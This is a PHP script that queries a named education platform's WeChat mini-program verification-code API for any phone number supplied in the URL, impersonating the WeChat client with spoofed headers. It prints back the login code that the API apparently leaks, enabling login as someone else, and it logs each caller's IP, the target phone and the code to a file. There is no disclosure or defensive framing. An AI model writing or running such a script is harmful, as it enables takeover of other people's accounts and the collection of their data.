<?php
$phone = $_GET['phone'] ?? '';
// 获取当前时间，精确到秒
$time = date("Y-m-d H:i:s");
// 获取客户端IP地址
$ip = $_SERVER['REMOTE_ADDR'];

// 初始化 cURL 会话
$curl = curl_init();

// 设置 cURL 选项
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://edu.hishizi.com/api/api/h5/sendCode', // 目标 URL
  CURLOPT_POST => true, // 发送 POST 请求
  CURLOPT_POSTFIELDS => json_encode(array('phone' => $phone)), // POST 数据
  CURLOPT_HTTPHEADER => array(
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581',
    'Content-Type: application/json',
    'xweb_xhr: 1',
    'x-ajax: json',
    'x-requested-with: XMLHttpRequest',
    'source: app',
    'Sec-Fetch-Site: cross-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://servicewechat.com/wx994917d030b9402a/138/page-frame.html',
    'Accept-Language: zh-CN,zh;q=0.9'
  ),
  CURLOPT_RETURNTRANSFER => true, // 返回响应结果
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, // 使用 HTTP/1.1
));

// 执行 cURL 请求
$response = curl_exec($curl);

// 检查是否有错误发生
if (curl_errno($curl)) {
  echo 'Error:' . curl_error($curl);
} else {
  // 解析响应结果为 JSON
  $responseData = json_decode($response, true);
  
  // 检查响应码是否为 200
  if ($responseData && $responseData['code'] == 200) {
    // 打印 data 的内容
    echo $phone . '的登录验证码是' . $responseData['data'] . '，如果重新获取验证码则当前验证码失效';
    // 写入日志
    $logMessage = $time . ' - ' . $ip . ' - ' . $phone . ' - 成功获取验证码: ' . $responseData['data'] . "\n";
  } else {
    // 如果响应码不是 200，打印错误信息
    echo 'Error: ' . $responseData['msg'] ?? 'Unknown error';
    // 写入日志
    $logMessage = $time . ' - ' . $ip . ' - ' . $phone . ' - 错误: ' . ($responseData['msg'] ?? 'Unknown error') . "\n";
  }

  // 获取IP地址的经纬度
  list($latitude, $longitude) = getLatitudeLongitudeFromIP($ip);
  // 将经纬度添加到日志信息中
  $logMessage .= "经纬度: $latitude, $longitude\n";

  // 将日志信息写入文件
  file_put_contents('login.ini', $logMessage, FILE_APPEND);
}

// 关闭 cURL 会话
curl_close($curl);
?>

<?php
/**
 * 根据IP地址获取经纬度
 * 这里是一个示例函数，实际使用时需要替换为真实的IP地址查询服务
 * @param string $ip IP地址
 * @return array 包含纬度和经度的数组
 */
function getLatitudeLongitudeFromIP($ip) {
    // 这里应该是调用IP地址查询服务的代码，返回经纬度
    // 以下是一个示例返回值
    return array(34.0522, -118.2437); // 示例经纬度：洛杉矶
}
?>
